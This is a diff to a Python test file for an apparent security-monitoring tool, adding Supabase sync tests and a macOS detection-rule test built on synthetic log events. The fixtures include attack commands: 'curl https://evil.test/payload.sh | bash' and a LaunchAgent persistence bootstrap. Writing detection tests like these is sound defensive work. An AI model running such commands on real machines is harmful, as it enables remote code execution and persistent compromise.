@@ -4,6 +4,7 @@ import sys
 import tempfile
 import unittest
 from pathlib import Path
+from unittest import mock
 
 
 REPO_ROOT = Path(__file__).resolve().parents[1]
@@ -175,6 +176,141 @@ class OpenClawFindingsTests(unittest.TestCase):
             payload = json.loads(show_result.stdout)
             self.assertEqual(payload["disposition"], "false_positive")
             self.assertEqual(payload["notes"][0]["author"], "cli-user")
+
+    def test_auto_sync_skips_when_supabase_config_missing(self):
+        with tempfile.TemporaryDirectory() as temp_dir:
+            dashboard_env = Path(temp_dir) / ".env"
+            with mock.patch.dict(openclaw_findings.os.environ, {}, clear=True), \
+                 mock.patch.object(openclaw_findings.subprocess, "run") as run_mock:
+                synced = openclaw_findings.maybe_sync_findings_to_supabase(
+                    db_path=str(Path(temp_dir) / "openclaw_soc.db"),
+                    findings_dir=temp_dir,
+                    dashboard_env=str(dashboard_env),
+                )
+        self.assertFalse(synced)
+        run_mock.assert_not_called()
+
+    def test_auto_sync_runs_when_supabase_config_available(self):
+        with tempfile.TemporaryDirectory() as temp_dir:
+            dashboard_env = Path(temp_dir) / ".env"
+            dashboard_env.write_text(
+                "SUPABASE_URL=https://example.supabase.co\nSUPABASE_SERVICE_ROLE_KEY=test-key\n",
+                encoding="utf-8",
+            )
+            completed = mock.Mock(stdout="synced_rows=7\n", stderr="")
+            with mock.patch.object(openclaw_findings.subprocess, "run", return_value=completed) as run_mock:
+                synced = openclaw_findings.maybe_sync_findings_to_supabase(
+                    db_path=str(Path(temp_dir) / "openclaw_soc.db"),
+                    findings_dir=temp_dir,
+                    dashboard_env=str(dashboard_env),
+                )
+        self.assertTrue(synced)
+        run_mock.assert_called_once()
+
+
+class MacOSDetectionPackTests(unittest.TestCase):
+    def test_macos_rules_emit_host_findings_with_actions(self):
+        events = [
+            {
+                "event_id": "mac-1",
+                "timestamp": "2026-03-28T10:00:00Z",
+                "platform": "macos",
+                "source": "unified_log",
+                "event_type": "auth_failure",
+                "outcome": "failure",
+                "severity_hint": "medium",
+                "actor": {"user": "alice", "process": "loginwindow"},
+                "metadata": {"macos_message": "Failed login for alice via loginwindow"},
+            },
+            {
+                "event_id": "mac-2",
+                "timestamp": "2026-03-28T10:02:00Z",
+                "platform": "macos",
+                "source": "unified_log",
+                "event_type": "auth_failure",
+                "outcome": "failure",
+                "severity_hint": "medium",
+                "actor": {"user": "alice", "process": "loginwindow"},
+                "metadata": {"macos_message": "Failed login for alice via loginwindow"},
+            },
+            {
+                "event_id": "mac-3",
+                "timestamp": "2026-03-28T10:04:00Z",
+                "platform": "macos",
+                "source": "unified_log",
+                "event_type": "auth_failure",
+                "outcome": "failure",
+                "severity_hint": "medium",
+                "actor": {"user": "alice", "process": "loginwindow"},
+                "metadata": {"macos_message": "Failed login for alice via loginwindow"},
+            },
+            {
+                "event_id": "mac-4",
+                "timestamp": "2026-03-28T10:06:00Z",
+                "platform": "macos",
+                "source": "unified_log",
+                "event_type": "auth_failure",
+                "outcome": "failure",
+                "severity_hint": "medium",
+                "actor": {"user": "alice", "process": "loginwindow"},
+                "metadata": {"macos_message": "Failed login for alice via loginwindow"},
+            },
+            {
+                "event_id": "mac-5",
+                "timestamp": "2026-03-28T10:07:00Z",
+                "platform": "macos",
+                "source": "unified_log",
+                "event_type": "process_exec",
+                "severity_hint": "high",
+                "actor": {"user": "alice", "process": "sudo /bin/bash -c whoami"},
+                "metadata": {"macos_message": "sudo: 3 incorrect password attempts"},
+            },
+            {
+                "event_id": "mac-6",
+                "timestamp": "2026-03-28T10:08:00Z",
+                "platform": "macos",
+                "source": "unified_log",
+                "event_type": "file_write",
+                "severity_hint": "high",
+                "actor": {"user": "alice", "process": "launchctl bootstrap gui/501 ~/Library/LaunchAgents/com.bad.plist"},
+                "metadata": {"macos_message": "Wrote ~/Library/LaunchAgents/com.bad.plist"},
+            },
+            {
+                "event_id": "mac-7",
+                "timestamp": "2026-03-28T10:09:00Z",
+                "platform": "macos",
+                "source": "unified_log",
+                "event_type": "process_exec",
+                "severity_hint": "medium",
+                "actor": {"user": "alice", "process": "curl https://evil.test/payload.sh | bash"},
+                "metadata": {"macos_message": "Downloaded and piped remote shell script"},
+            },
+            {
+                "event_id": "mac-8",
+                "timestamp": "2026-03-28T10:10:00Z",
+                "platform": "macos",
+                "source": "unified_log",
+                "event_type": "process_exec",
+                "severity_hint": "high",
+                "actor": {"user": "alice", "process": "/Users/Shared/Updater.app/Contents/MacOS/Updater"},
+                "metadata": {"macos_message": "binary is unsigned and not notarized"},
+            },
+        ]
+
+        result = run_detection(events)
+        findings = result.get("findings", [])
+        rule_ids = {finding["rule_id"] for finding in findings}
+
+        self.assertTrue(findings)
+        self.assertTrue({"RULE-201", "RULE-202", "RULE-203", "RULE-204", "RULE-205"}.issubset(rule_ids))
+
+        sample = next(finding for finding in findings if finding["rule_id"] == "RULE-203")
+        self.assertIn("summary", sample)
+        self.assertIn("recommended_actions", sample)
+        self.assertTrue(sample["recommended_actions"])
+        self.assertTrue(sample["evidence"])
+        self.assertEqual(sample["platform"], "macos")
+
 
 
 if __name__ == "__main__":
